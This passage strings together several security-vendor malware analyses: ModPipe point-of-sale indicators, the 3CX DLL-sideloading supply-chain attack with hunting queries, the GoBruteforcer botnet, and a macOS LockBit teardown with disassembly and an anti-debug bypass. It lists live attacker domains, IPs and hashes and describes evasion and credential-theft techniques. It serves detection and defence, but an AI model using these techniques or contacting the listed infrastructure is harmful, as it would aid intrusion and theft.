Probably the most intriguing finding is the algorithm hidden in one of the backdoor’s modules, which was specifically designed to steal credentials by decrypting them from registry values.
By acquiring the database passwords, the attackers gain broad access to sensitive information even though the most sensitive data stored in devices running RES 3700 POS should still be protected by encryption. 
ModPipe’s architecture, modules and their capabilities also indicate that its writers have extensive knowledge of the targeted RES 3700 POS software.
The proficiency of the operators could stem from multiple scenarios, including stealing and reverse engineering the proprietary software product, misusing its leaked parts or buying code from an underground market. 
To keep the operators behind ModPipe at bay, potential victims in the hospitality sector as well as any other businesses using the RES 3700 POS are advised to: Use the latest version of the software. 
Use it on devices that run updated operating system and software. 
Use reliable multi-layered security software that can detect ModPipe and similar threats. 
Indicators of Compromise C&C IP addresses 191.101.31[.]223 194.32.76[.]192 23.19.58[.]114 88.99.177[.]103 91.209.77[.]172 5.135.230[.]136 C&C domains/URLs subzeroday.zapto[.]org shj145ertyb.ddns[.]net/gettime.html ouidji12345.ddns[.]net/gettime.html 
Dropper samples 9F8530627A8AD38F47102F626DEC9F0173B44CD5 FEE9C08B494C80DBF73A6F70FACD20ED0429330D Loader samples 0D1A4CB620576B8ADD34F919B4C6C46E7C3F9A59 B47E05D67DC055AF5B0689782D67EAA2EB8C75E3 F213B4EEF63F06EC127D3DC3265E14EE190B71E5 B2CE307DFE65C188FDAE169ABD65B75B112522C4 2AC7A2C09E50EAFABF1F401194AC487ED96C6781 0F4355A17AABD3645788341EAC2A9BB759DB95EE 
File paths %CSIDL_APPDATA%\Microsoft\Windows\{%rand_guid%}\explorer.exe %WINDIR%\system32\%random_name%.exe %rand_guid% – pseudo-random GUID formatted string %random_name% – from 4 to 7 pseudo-random letters (a-z) with the first one capital e.g. “Cvoeqo.exe” MITRE ATT&CK techniques Note: This table was built using version 7 of the MITRE ATT&CK framework. 
TacticIDNameDescription ExecutionT1059.003Command and Scripting Interpreter:
Windows Command ShellAttackers were seen using Windows Command Shell to execute the initial dropper. PersistenceT1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderModPipe can use Registry Run key for persistence. 
T1543.003Create or Modify System Process:
Windows ServiceModPipe can create a new service for persistence. 
Privilege EscalationT1134.001Access Token Manipulation:
Token Impersonation/TheftAttackers were seen using partially modified PrintSpoofer tool to drop and subsequently execute loader with SYSTEM privileges. 
Defense EvasionT1055.002Process Injection: Portable Executable InjectionModPipe can inject it’s modules into various processes. 
T1205Traffic SignalingModPipe’s ModScan module sends random 32-bit values to TCP ports 50123 and 2638 of the specified IP address and requires a specific response in order to continue executing its scan functionality. 
Credential AccessT1552.002Unsecured Credentials: Credentials in RegistryModPipe’s GetMicInfo module retrieves encrypted database passwords for ORACLE MICROS RES 3700 POS software from Windows Registry and uses a custom algorithm to decrypt them before uploading to the C&C. DiscoveryT1057Process DiscoveryModPipe’s ProcList module can get information about processes running on a system. 
T1012Query RegistryModPipe’s GetMicInfo module queries the Registry for ORACLE MICROS RES 3700 POS version, database passwords and other configuration data. 
T1033System Owner/User DiscoveryModPipe gathers username and computer name from victim machines and reports them to the C&C in initial message. 
Command and ControlT1071.001Application Layer Protocol: Web ProtocolsModPipe uses HTTP for command and control. 
T1573.001Encrypted Channel:
Symmetric CryptographyModPipe encrypts communication with C&C using AES in CBC mode. 
ExfiltrationT1041Exfiltration
Over C2 ChannelModPipe exfiltrates data over its C&C channel. T1029Scheduled TransferDefault interval used by ModPipe for uploading data to C&C is set to 30 minutes. 
12 Nov 2020 - 11:30AM 
title: Update 2: 3CX users under DLL-sideloading attack: What you need to know url: https://news.sophos.com/en-us/2023/03/29/3cx-dll-sideloading-attack/ Sophos X-Ops is tracking a developing situation concerning a seeming supply-chain attack, possibly undertaken by a nation-state-related group.
This page provides an overview of the situation, a threat analysis, information for hunters, and information on detection protection. 
We will update this page as events and understanding develop, including our threat and detection guidance. 
[Latest version published 23:00 UTC 01-April-23, adding Troj/Steal-DLG to Detection Protections/Static detection, two more queries customers may use to determine their exposure to the attack, new analysis of an emergent line of inquiry concerning a timestamp mechanism in the malicious code, and information on analysis of other Electron-built apps using ffmpeg.dll 23:30 UTC 30-March-23, adding detail on affected versions, misuse of ffmpeg.dll, removal of malicious repository, comparison of PE shellcode loader to that used by Lazarus threat group, more queries customers may use to determine their exposure to the attack, and various additional detections] Overview The affected software is 3CX – a legitimate software-based PBX phone system available on Windows, MacOS, Linux, Android, and iOS.
Some Windows and MacOS versions of the application have been abused by the threat actor to add an installer that communicates with various command-and-control (C2) servers. 
The software is a digitally signed version of the softphone desktop client for both Windows and MacOS, which includes a malicious payload.
According to 3CX, their Update 7 for Windows, version numbers 18.12.407 and 18.12.416, and Electron Mac App version numbers 18.11.1213, 18.12.402, 18.12.407 and 18.12.416, are affected.
The most common post-exploitation event we have observed to date is the presence of an infostealer that targets the browser(s) on a compromised system.
At this writing, 3CX has deprecated the affected versions of the Windows application. 
At present, the only platforms confirmed by our customer data to be affected are Windows and MacOS, which is in agreement with 3CX’s information on affected platforms.
According to information on their support forum, Android and iOS versions of the software are not believed to be affected. 
Threat analysis On March 22, users of 3CX began discussion of potential false-positive detections of 3CXDesktopApp by their endpoint security agents. 
Figure 1: The update process at the moment the malicious version drops Sophos MDR first identified malicious activity directed at its own customers and stemming from 3CXDesktopApp on March 29, 2023.
Additionally, Sophos MDR has observed the campaign leveraging a public file storage to host encoded malware.
This repository has been in use since December 8, 2022; after news of the compromise spread widely on March 29, the repository was taken down. 
The attack revolves around a DLL sideloading scenario, one with a remarkable number of components involved.
This is likely to ensure that customers were able to use the 3CX desktop package without noticing anything unusual about the affected package.
We have identified three crucial components: 3CXDesktopApp.exe, the clean loader d3dcompiler_47.dll, a DLL with an appended encrypted payload ffmpeg.dll, a Trojanized loader Figure 2 presents a high-level look at the attack flow as it works in Windows; there are some minor variations in the later steps with the MacOS version. 
Figure 2: A high-level view of the attack flow The file ffmpeg.dll contains an embedded URL which retrieved a malicious encoded .ico payload from GitHub file storage at https[:]//raw.githubusercontent.com/IconStorages/images/main/ — though, again, once news of the compromise spread widely, this repository was taken down. 
We saw several variations on the ffmpeg.dll file, including one that was signed by 3CX’s own certificate; these appear to be maliciously patched versions of the legitimate ffmpeg.dll.
In a statement on Thursday, the team responsible for ffmpeg’s source code took pains to distance their work from the 3CX compromise. 
Figure 3: When ffmpeg stepped onto Twitter to defend its code In a normal DLL sideloading scenario, the malicious loader (ffmpeg.dll) would replace the clean dependency; its only function would be to queue up the payload.
However, in this case, that loader is also entirely functional, as it would normally be in the 3CX product – instead, there’s an additional payload inserted at the DllMain function.
This adds bulk, but may have lowered suspicions – the abused 3CX application functions as expected, even as the Trojan addresses reached out to the C2 beacon. 
As part of our analysis, we also did a comparison of the ffmpeg.dll in 3CX with the same file in other Electron apps.
Our analysis has shown only the 3CX ffmpeg.dll contains the malicious code.
We conclude from this that this compromise does not affect other Electron apps — only the 3CX ffmpeg.dll. Figure 4: What the affected 3CX developers and customers experienced Allowing the abused software to remain functional is not dissimilar to other DLL sideloading cases we’ve seen, but this campaign is slightly different even from the current rash of DLL sideloading cases we’ve seen.
In particular, we’ve noted that the PE shellcode loader in use is unique in our experience.
Previous to this, we’ve only seen it in incidents attributed to the Lazarus group; the code in this incident is a byte-to-byte match to those previous samples. 
TimeStamp Check Analysis As part of our ongoing investigation, we found a timestamp mechanism in the code as shown below. 
Figure 5: A timestamp mechanism in the code Looking at this, we can see a while loop that calls the check_timestamp function and receives a 64-bit integer value from GetSystemTimeAsFileTime Api call.
The results of check_timestamp are evaluated against “v6,” a variable which holds the value coming from cbData. 
cbData is collected from the “manifest” file as shown below. 
Figure 6: Collecting the cbData “manifest” is a file that the malware writes to the system under the “3cxdesktopapp” folder during the initial stage of the infection.
When the manifest is created, a dword value is written based on the current timestamp, with additional arithmetic operations performed on it. 
The above code checks if manifest exists and is writeable; if so, then it adds 7 days + the current system timestamp + rand() generated number % 21 days.
In other words, the value be up to a total of 28 days ahead.
Otherwise, it just reads the existing value from the manifest file. 
So long as the results of check_timestamp are less than v6 (the timestamp value from manifest), the loop continues to sleep.
Only once the results of check_timestamp are greater than the manifest timestamp will the code proceed and generate the HTTP request to connect with GitHub, which initiates the payload download. 
Hunting information Determining impact with Sophos XDR 1.
Determining whether hosts have communicated with threat actor infrastructure:
Data Lake The below query will search for hosts that have communicated with the various known URLs in use by this campaign. 
SELECT meta_hostname, sophos_pids, domain, clean_urls, source_ips, destination_ips, timestamps, ingestion_timestamp FROM xdr_data WHERE query_name = 'sophos_urls_windows' AND (LOWER(domain) LIKE '%akamaicontainer[.]com%' OR LOWER(domain) LIKE '%akamaitechcloudservices[.]com%' OR LOWER(domain) LIKE '%azuredeploystore[.]com%' OR LOWER(domain) LIKE '%azureonlinecloud[.]com%' OR LOWER(domain) LIKE '%azureonlinestorage[.]com%' OR LOWER(domain) LIKE '%dunamistrd[.]com%' OR LOWER(domain) LIKE '%glcloudservice[.]com%' OR LOWER(domain) LIKE '%journalide[.]org%' OR LOWER(domain) LIKE '%msedgepackageinfo[.]com%' OR LOWER(domain) LIKE '%msstorageazure[.]com%' OR LOWER(domain) LIKE '%msstorageboxes[.]com%' OR LOWER(domain) LIKE '%officeaddons[.]com%' OR LOWER(domain) LIKE '%officestoragebox[.]com%' OR LOWER(domain) LIKE '%pbxcloudeservices[.]com%' OR LOWER(domain) LIKE '%pbxphonenetwork[.]com%' OR LOWER(domain) LIKE '%pbxsources[.]com%' OR LOWER(domain) LIKE '%qwepoi123098[.]com%' OR LOWER(domain) LIKE '%sbmsa[.]wiki%' OR LOWER(domain) LIKE '%sourceslabs[.]com%' OR LOWER(domain) LIKE '%visualstudiofactory[.]com%' OR LOWER(domain) LIKE '%zacharryblogs[.]com%' OR (LOWER(domain) LIKE '%raw.githubusercontent[.]com%' AND LOWER(clean_urls) LIKE '%/iconstorages/images/main/%')) 
2. Determining whether hosts have interacted with malicious files SELECT f.filename, f.directory, ROUND((f.size * 10e-7),2) AS size_MB, h.sha256, f.type, f.attributes, f.mode, datetime(f.btime,'unixepoch') AS file_created_time, datetime(f.atime,'unixepoch') AS file_last_access_time, datetime(f.mtime,'unixepoch') AS file_last_modified_time, datetime(f.ctime,'unixepoch') AS file_last_status_change_time, f.uid, u.username AS file_owner FROM file f LEFT JOIN users u ON f.uid = u.uid LEFT JOIN groups g ON f.gid = g.gid LEFT JOIN hash h ON f.path = h.path 
WHERE f.path like 'c:\users\%\appdata\local\programs\3cxdesktopapp\app\%' 
AND (f.filename = 'ffmpeg.dll' OR f.filename LIKE 'd3dcompiler%.dll' OR f.filename = 'trololo.dll') 
AND (h.sha256 = 'c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02' OR h.sha256 = '11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03' OR h.sha256 = '7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896' OR h.sha256 = 'aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973') 
3.
Determining whether hosts are running affected versions SELECT MIN(ingestion_timestamp) AS first_seen, MAX(ingestion_timestamp) AS last_seen, meta_hostname, ARRAY_JOIN(ARRAY_AGG(DISTINCT(meta_hostname)), ', ')
AS hosts, ARRAY_JOIN(ARRAY_AGG(sophos_pid),', ')
AS spids, LOWER(name) AS name, sha256, company_name, file_description, file_size, file_version, original_filename FROM xdr_data WHERE query_name = 'running_processes_windows_sophos' AND ( LOWER(name) = '3cxdesktopapp.exe' OR LOWER(original_filename) = '3cxdesktopapp.exe' OR LOWER(product_name)
='3cx desktop app') 
GROUP by meta_hostname, LOWER(name), sha256, company_name, file_description, file_size, file_version, original_filename ORDER BY meta_hostname desc 4.
Determining whether hosts have communicated with threat actor infrastructure, for MacOS SELECT meta_hostname, date_format(from_unixtime(time), '%Y-%m-%d
%H:%i:%s')
AS date_time, ingestion_timestamp pid, name, cmdline, path, parent, gid, uid, euid, egid, sha1, sha256 FROM xdr_data WHERE query_name = 'running_processes_osx_events' AND LOWER(cmdline) LIKE '%sh -c%' AND LOWER(cmdline) LIKE '%/3cx desktop app/updateagent%' 5.
Enabling firewall customers to identify activity to malicious domains SELECT timestamp, log_component, log_subtype, user_name, user_group, app_name, src_ip, src_port, protocol, dst_ip, dst_port, http_category, url, domain, http_user_agent, http_status FROM xgfw_data WHERE LOWER(log_component) = 'http' AND (LOWER(domain) = 'akamaicontainer.com' OR LOWER(domain) = 'akamaitechcloudservices.com' OR LOWER(domain) = 'azuredeploystore.com' OR LOWER(domain) = 'azureonlinecloud.com' OR LOWER(domain) = 'azureonlinestorage.com' OR LOWER(domain) = 'dunamistrd.com' OR LOWER(domain) = 'glcloudservice.com' OR LOWER(domain) = 'journalide.org' OR LOWER(domain) = 'msedgepackageinfo.com' OR LOWER(domain) = 'msstorageazure.com' OR LOWER(domain) = 'msstorageboxes.com' OR LOWER(domain) = 'officeaddons.com' OR LOWER(domain) = 'officestoragebox.com' OR LOWER(domain) = 'pbxcloudeservices.com' OR LOWER(domain) = 'pbxphonenetwork.com' OR LOWER(domain) = 'pbxsources.com' OR LOWER(domain) = 'qwepoi123098.com' OR LOWER(domain) = 'sbmsa.wiki' OR LOWER(domain) = 'sourceslabs.com' OR LOWER(domain) = 'visualstudiofactory.com' OR LOWER(domain) = 'zacharryblogs.com' OR (LOWER(domain) LIKE '%raw.githubusercontent.com%' AND LOWER(url) LIKE '%/iconstorages/images/main/%')) 
5.
Enabling firewall customers to identify user agents of compromised version of 3cx SELECT timestamp, log_component, log_subtype, user_name, user_group, app_name, src_ip, src_port, protocol, dst_ip, dst_port, http_category, url, domain, http_user_agent, http_status FROM xgfw_data WHERE LOWER(log_component) = 'http' AND ( LOWER(http_user_agent) LIKE '%3cxdesktopapp/18.12.402%' OR LOWER(http_user_agent) LIKE '%3cxdesktopapp/18.12.416%' OR LOWER(http_user_agent) LIKE '%
3cxdesktopapp/18.12.407%' OR LOWER(http_user_agent) LIKE '%3cxdesktopapp/18.11.1213%' OR LOWER(http_user_agent) LIKE '
%3cxdesktopapp/18.11.1197%' ) 
We also recommend that users of 3CX’s software continue to monitor the company’s communications channels; they have a blog and also a support-and-information forum.
As of March 30, the company was recommending that customers uninstall and reinstall the app, and suggested that they might also use the company’s browser-based PWA client while the situation was sorted out. 
On March 31, 3CX noted that Google has invalidated the company’s previous signing certificate, which means both the originally infected MSI files plus files issued by 3CX earlier in the week using that certificate will be blocked, and issued a fresh one.
3CX at this writing is building entirely new MSI installers using the newly issued certificate.
This applies to Windows only, as the company states they will not be rebuilding the Mac version of the desktop app yet while they focus on the Windows version (and on the security breach in general). 
An updated list of IOCs for this attack is published on our GitHub. 
Detection protection SophosLabs has blocked the malicious domains and published the following detections: Static detections: Troj/Loader-AF (Trojanized ffmpeg.dll) Troj/Mdrop-JTQ (installers) Troj/Steal-DLG OSX/Mdrop-JTR (installers) OSX/Loader-AG (Trojanized ffmpeg.dll) Reputation detection: Mal/Generic-R / Mal/Generic-S (d3dcompiler with appended shellcode) Memory detection: We have also blocked the list of known C2 domains associated with the threat and will continue to add to that list in the IOC file on our GitHub, as noted above.
Finally, the two malicious versions of the ffmpeg.dll bundled in the affected 3CXapplication are flagged by their hashes as being of low reputation. 
SophosLabs is actively investigating additional detection opportunities for activity stemming from this software.
In addition, for customers of Sophos MDR, the MDR Detection Engineering team has a variety of behavioral detections in place that will detect follow up activity. 
title: GoBruteforcer: Golang-Based Botnet Actively Harvests Web Servers url: https://unit42.paloaltonetworks.com/gobruteforcer-golang-botnet/ This post is also available in: 日本語 (Japanese)Executive Summary Unit 42 researchers recently discovered a new sample of Golang-based malware.
We have dubbed it GoBruteforcer, and it targets web servers, specifically those running phpMyAdmin, MySQL, FTP and Postgres services.
The sample was originally captured from our Next-Generation Firewall.
Upon further research, we found that the malware was hosted on a legitimate website. 
Further investigation revealed that the attacker hosted binaries for x86, x64 and ARM processor architectures.
We also discovered that GoBruteforcer had deployed an internet relay chat (IRC) bot on the victim server, which communicates with the attacker’s server. 
This blog details information collected based on a static overview of the GoBruteforcer attack chain components.
For successful execution, the samples require special conditions on the victim system like specific arguments being used and targeted services already being installed (with weak passwords). 
Palo Alto Networks customers receive protections from malware families like GoBruteforcer and its malicious components with Cortex XDR or the Next-Generation Firewall with cloud-delivered security services including WildFire and Advanced Threat Prevention.
Alongside this, Advanced URL Filtering and DNS Security can block the command and control (C2) domain and malware hosting URLs. 
Table of Contents IntroductionScanning and System AccessFor the phpMyAdmin ServiceIRC Bot DeploymentFor MySQL and Postgres ServicesFor the FTP ServicePostResult Module and Web Shell ConnectionGoBruteforcer Makes AdvancesConclusionIndicators of Compromise Introduction Go programming language, also known as Golang, is a newer language that’s becoming more popular with malware programmers.
It has proven to be versatile enough to develop all kinds of malware, including ransomware, stealers or remote access trojans (RATs).
Golang-based botnets in particular seem to be gaining the interest of threat actors. 
GoBruteforcer is a new kind of botnet malware that is written in Golang and targets web servers, specifically those running phpMyAdmin, MySQL, FTP and Postgres services. 
GoBruteforcer chose a Classless Inter-Domain Routing (CIDR) block for scanning the network during the attack, and it targeted all IP addresses within that CIDR range.
The threat actor chose CIDR block scanning as a way to get access to a wide range of target hosts on different IPs within a network instead of using a single IP address as a target. 
Once a host is found, GoBruteforcer tries to get access to the server via brute force.
After achieving access, GoBruteforcer deploys an IRC bot containing the attacker’s URL. 
Later, GoBruteforcer also tries to query the victim system using a PHP web shell.
We found that this web shell was already deployed onto the victim server.
Figure 1 depicts this attack flow. 
Figure 1.
GoBruteforcer attack chain.
The cache_init file highlighted in Figure 2 is the GoBruteforcer malware we found hosted in the /.x/ directory of the targeted server.
The initial vector of the GoBruteforcer and the PHP web shell campaign is not known yet. 
We have notified the victim about the malicious GoBruteforcer binaries hosted on their site. Figure 2.
GoBruteforcer hosted on a victim server.
The GoBruteforcer malware hashes we found mainly targeted Unix-like (*nix) platforms, with versions for x86, x64 and ARM architectures.
It seems likely that this is their OS of choice because *nix operating systems are a popular choice for hosting servers. 
We’ve seen this malware remotely deploy a variety of different types of malware as payloads, including coinminers.
We believe that GoBruteforcer is in active development, and as such, things like initial infection vectors or payloads could change in the near future. 
Scanning and System Access The GoBruteforcer malware samples are packed with UPX Packer.
Upon unpacking a sample (SHA256 ebe11121aafdac5d8f2eecba710ba85efa31617a5eb825ba2e89e23379b26b84), we observed that GoBruteforcer has a multiscan module (shown in Figure 3) it uses to scan for the hosts inside a CIDR for its attack. 
Figure 3.
GoBruteforcer multiscan function.
On the target IP address, the malware starts scanning for phpMyAdmin, MySQL, FTP and Postgres services.
The attacker has defined separate scanning modules against all the aforementioned services, as shown in Figure 4. Figure 4.
Modules inside GoBruteforcer for scanning different services.
Inside the modules, the malware first checks if the port belonging to the service is open.
For this, the port scan module (shown in Figure 5) is called inside every scanning module. 
Figure 5.
Portscan function (present inside every scanning module).For the phpMyAdmin Service When scanning for phpMyAdmin services, if the target port (port 80) is open, the GoBruteforcer malware tries to login and get access to the victim server via brute force.
To do this, the malware uses a set of credentials that is hard coded into the malware binary, as shown in Figure 6. Figure 6.
Hard-coded credentials for brute forcing.
IRC Bot Deployment Upon successful login via phpMyAdmin service into the victim server, GoBruteforcer deploys and executes an IRC bot on the victim server.
The files fb5 and ab5 are IRC bots compiled for x86_64 and ARM architectures respectively, as shown in Figures 7 and 8. 
Figure 7.
GoBruteforcer deploying IRC bot for x86-supported platforms.
Figure 8.
GoBruteforcer deploying IRC bot for ARM-supported platforms.
Later, the malware starts communication between the command and control channel (C2) and the victim server via the IRC bot, as shown in Figure 9. Figure 9.
Victim and C2 communication via IRC bot.
Additionally, the IRC bot also registers itself inside cron for recurring execution. Figure 10.
IRC registering itself in cron.
For MySQL and Postgres Services When scanning for MySQL and Postgres services, the GoBruteforcer malware first checks whether ports 3306 and 5432 are open.
If the malware finds the ports open, then the malware tries to ping the host’s database with a certain username and password.
(Figures 11 and 12 show this activity, and you can also refer to the following post on the Golang Issues forum for more information). 
After that, the malware calls the PostResult module, which will be discussed in greater detail in the later section, PostResult Module and Web Shell Connection. 
Figure 11.
MySql ping done by GoBruteforcer malware.
Figure 12.
Postgres ping done by GoBruteforcer malware.
For the FTP Service When scanning for FTP services, GoBruteforcer checks whether port 21 is open.
If the malware finds it open, it tries to authenticate to the server (as shown in Figure 13) using the goftp library, which is an FTP client package for Golang. 
Figure 13.
FTP login attempt.
Upon successful authentication to the victim server, the malware calls the PostResult module. 
PostResult Module and Web Shell Connection Inside GoBruteforcer's PostResult module, which is called after every service scanning module, we observed a hard coded link (query) as shown in Figure 14. Figure 14.
Hard coded link found inside GoBruteforcer binary.
On further investigation into the directories within the victim IP address, we found a web shell named x, (http[:]//victim-ip/x) with SHA256 de7994277a81cf48f575f7245ec782c82452bb928a55c7fae11c2702cc308b8b.
This web shell seemed similar to the pst.php PHP file (SHA256 602129f00bb002f07db07affa78d46f67bd0b2c8fb0867ea2da5fc3e73dd2665) associated with http[:]//5.253.[.]84[.]159 (see Figure 15). 
The PHP web shell had reverse shell and bind shell capabilities, as shown in Figure 15. Figure 15.
Bind shell and reverse shell capabilities inside webshell.
Along with these capabilities, the web shell also has a packet crafter (shown in Figure 16) having the options for input like host, start, end port and timeouts for connection and the stream.
This gives the attacker the ability to gain more insight into the targeted network. Figure 16.
Simple packet crafter capabilities inside web shell. 
GoBruteforcer Makes Advances During our hunt for the samples related to GoBruteforcer campaign, we found another sample (SHA256 acc705210814ff5156957c028a8d6544deaca0555156504087fdc61f015d6834).
This is possibly an older version of the GoBruteforcer family that only targeted the phpMyAdmin service in order to infect web servers.
The sample was uploaded on VirusTotal some months ago and had 0 detections, as shown in Figure 17. Figure 17.
VirusTotal detection: older version of GoBruteforcer.Conclusion Web servers have always been a lucrative target for threat actors.
Weak passwords could lead to serious threats as web servers are an indispensable part of an organization.
Malware like GoBruteforcer takes advantage of weak (or default) passwords. 
The GoBruteforcer bot comes with a multiscan capability, which gives it a wide range of targets that it can use to get into a network.
GoBruteforcer also seems to be in active development, so attackers could change the techniques they use to target web servers in the near future. 
Alongside this, Advanced URL Filtering and DNS Security can block the command and control (C2) domain and malware hosting URLs. Indicators of Compromise Hashes de7994277a81cf48f575f7245ec782c82452bb928a55c7fae11c2702cc308b8b Web shell 602129f00bb002f07db07affa78d46f67bd0b2c8fb0867ea2da5fc3e73dd2665 Web shell acc705210814ff5156957c028a8d6544deaca0555156504087fdc61f015d6834 Older version of GoBruteforcer 426b573363277554c7c8a04da524ddbf57c5ff570ea23017bdc25d0c7fd80218 IRC bot(x86) 726ccd223a1cfb60fc6c3b48ea3dbf057da918efac5acf620cd026ee38fb0044 IRC bot(ARM) 526767fbb26c911601371745d603885b75deabcc18261ed2d5a509d58f95d28e GoBruteforcer (x86_64) dd3555025957cd51cd048d920027a0ff2d5501bc85792529217d54086e9351c2 GoBruteforcer (x86_64) df7dc0fe7e90a2414ac188c55d06ad3882cfc7394869c9ffa549fb1ddb304919 GoBruteforcer (x86_64) ebe11121aafdac5d8f2eecba710ba85efa31617a5eb825ba2e89e23379b26b84 GoBruteforcer (x86_64) 5548935e7c6cf3b38240a0579cac36906e9883a1ec5e85335609e9e2062588c5 GoBruteforcer ARM(64-bit) 5627b138bc857081d2251edd7eb3b68cbd58dfff2f51b7cd34c893fffff2cfab GoBruteforcer ARM(64-bit) 5c1d3fb43e9e35b835e62e05a7b97ed66ab132eab35bfc18ce543e8f58ccf5e2 GoBruteforcer ARM(32-bit) 7c27ac0daba19de227fcc467abfcdefa99426c768a3601b1b181e9741717665b GoBruteforcer (x86) URL and IP 5.253[.]84[.]159/x fi[.]warmachine[.]su Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: The LockBit ransomware (kinda) comes for macOS url: https://objective-see.org/blog/blog_0x75.html The LockBit ransomware (kinda) comes for macOS Analyzing a arm64 mach-O version of LockBit by: Patrick Wardle / April 16, 2023 Objective-See's research, tools, and writing, are supported by the "Friends of Objective-See" such as: :memo: :alien_monster: Want to play along? 
As “Sharing is Caring” I’ve uploaded the malicious binary LockBit to our public macOS malware collection.
The password is: infect3d ...please though, don't infect yourself! 
Background Late Saturday (April 15the), @MalwareHunterTeam tweeted about a new LockBit ransomware variant targeting macOS: As shown in the tweet, the ransomware binary initially was undetected by any of the anti-virus engines on VirusTotal: locker_Apple_M1_64 on VirusTotal (image credit: @MalwareHunterTeam) 
Good news, if you refresh the page on VirusTotal the av engines are now starting to pick up the file as malicious. 
Shortly after @MalwareHunterTeam’s tweet, the fine folks of @vxunderground added their thoughts and shared samples: The relevance of this macOS specimen is well articulated in VXUnderground’s tweet: “Lockbit ransomware group has created their first MacOS-based payload.
We believe this is the first time a large ransomware threat group has developed a payload for Apple products.”
-VXUnderground 
Ok, so even though it’s the weekend, we have what appears to be a new macOS malware specimen from one of the more notorious ransomware gangs!
Coupled with the fact that this may be, (as noted by @VXUnderground), “the first time a large ransomware threat group has developed a payload for Apple products” …I was intrigued to decided to dig right in! 
In this blog post we’ll tear apart the sample, showing that ultimately, while yes it can indeed run on Apple Silicon, that is basically the extent of it’s impact.
Thus macOS users have nothing to worry about …for now! 
Triage The (SHA-1) hash for the binary (aptly named locker_Apple_M1_64) is 9e9a5f8d86356796162cee881c843cde9eaedfb3 While we're only focusing on the macOS sample, it appears the LockBit group has built this sample for a host of other OS's: Using macOS’s file utility, we see the locker_Apple_M1_64 binary is an x86_64 (Intel) Mach-O: % file LockBit/locker_Apple_M1_64 LockBit/locker_Apple_M1_64: Mach-O 64-bit executable arm64 And what about it’s code signing information?
Let’s take a peek via macOS’s codesign and spctl utilities: 
% codesign -dvv
LockBit/locker_Apple_M1_64 Executable=LockBit/locker_Apple_M1_64 Identifier=locker Format=Mach-O thin (arm64) CodeDirectory v=20400 size=3295
flags=0x20002(adhoc,linker-signed) hashes=100+0 location=embedded Signature=adhoc Info.plist=not bound TeamIdentifier=not set Sealed Resources=none Internal requirements=none % spctl -a -vvv
-t install LockBit/locker_Apple_M1_64 LockBit/locker_Apple_M1_64: invalid signature (code or signature have been modified) 
The codesign utility shows that though it’s signed, it’s signed “ad-hoc” (say vs. an Apple Developer ID).
This means if downloaded to a macOS system (i.e. deployed by the attackers) macOS won’t let it run.
This is confirmed by the spctl utility which shows “invalid signature” …or if you’re brave enough to try run it: An invalid signature means macOS will block it Let’s now run the strings command (with the "-" option which instructs it to scan the whole file), we find a few strings that appear to be related to standard ransomware activity including: Encryption File Extensions Ransom instructions % strings - -n 3 locker_Apple_M1_64 curve25519xsalsa20poly1305 blake2b blake2b_final blake2b-ref.c sodium_crit_enter _sodium_malloc /dev/urandom /dev/random ... 
cmd ani adv msi msp com nls ocx mpa cpl mod hta prf rtp rdp bin shs wpx bat rom msc spl ics key exe dll ... restore-my-files.txt ... winmd ntldr ntuser.dat.log bootsect.bak autorun.inf thumbs.db iconcache.db Also interesting are the strings related to Windows artifacts (e.g. autorun.inf, ntuser.dat.log, etc…).
This may indicate the ransomware was originally written to target Windows platforms. 
This wraps up our triage of the locker_Apple_M1_64 binary.
Time to dive in deeper with our trusty friends: the disassembler and debugger! 
Analysis of locker_Apple_M1_64 In this section we’ll more deeply analyze the malicious logic of the locker_Apple_M1_64 binary …which is simplified by the fact that the binary’s symbols aren’t stripped.
(So function and method names are left intact ….yay!) 
First, we pointed out that the locker_Apple_M1_64 is an arm64 binary (Mach-O 64-bit executable arm64).
This means we better have at least a cursory understanding of AArch64.
If you’re not familiar with this instruction set, here’s two of my favorite resources to get you up to speed: Opening the malware in a disassembler, (starting at its main) we spot some (fairly common) anti-debugging logic: main ... 000000010000b108 bl imp___stubs__getppid 000000010000b10c mov x1, x0 000000010000b110 mov w0, #0x1f 000000010000b114 mov x2, #0x0 000000010000b118 mov w3, #0x0 000000010000b11c bl imp___stubs__ptrace 000000010000b120 cmn w0, #0x1 In short, this snippet of code invokes ptrace with PT_DENY_ATTACH (0x1f) which will kill the process if a debugger is currently attached, and also prevent future attachments. 
As we’ll want to debug the malware to gain a deeper understanding of its functionality, we’ll have to bypass this.
Good news, this is trivial!
Just set a breakpoint on the address of the call to ptrace (b 0x000000010000b11c), and once this is hit, simply skip over the call by modifying the instruction pointer to point it to the next instruction (reg write $pc 0x000000010000b120).
Since the call to ptrace will now be skipped, we’re free to debug to our hearts content. 
% lldb locker_Apple_M1_64 (lldb) target create "locker_Apple_M1_64" Current executable set to 'locker_Apple_M1_64' (arm64). 
(lldb) b 0x10000b11c (lldb) r * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1 locker_Apple_M1_64`main: -> 0x10000b11c
<
+72>: bl 0x1000429cc ; symbol stub for: ptrace (lldb) reg write $pc 0x10000b120 
Next the malware copies a chunk of encrypted data (size: 0x2468 bytes) from a variable named apple_config to a variable named g_Config. 
000000010000b128 adr x21, #0x10005908c ;g_Config 000000010000b12c nop 000000010000b130 adr x1, #0x100058008 ;apple_config 000000010000b134 nop 000000010000b138 mov x0, x21 000000010000b13c mov w2, #0x2468 000000010000b140 bl imp___stubs__memcpy 
The apple_config variable is noteworthy as this is the only instance (I found) of any macOS specific references / customizations.
(The rest of the malware’s binary simple looks like Linux code, compiled for macOS). 
Next, we find an XOR loop that decrypts this configuration. 
000000010000b144 mov x8, #0x0 000000010000b148 mov w9, #0x2458 loc_10000b14c: 000000010000b14c and x10, x8, #0xf 000000010000b150 ldrb w10, [x21, x10] 000000010000b154 add x11, x21, x8 000000010000b158 ldrb w12, [x11, #0x10] 000000010000b15c eor w10, w12, w10 000000010000b160 strb w10, [x11, #0x10] 000000010000b164 add x8, x8, #0x1 000000010000b168 cmp x8, x9 000000010000b16c b.ne loc_10000b14c Once de-XOR’d we find a few strings as "!!!
-Restore-My-Files-!!!
", "VMware vCenter Server", and XP_SP;Win10.
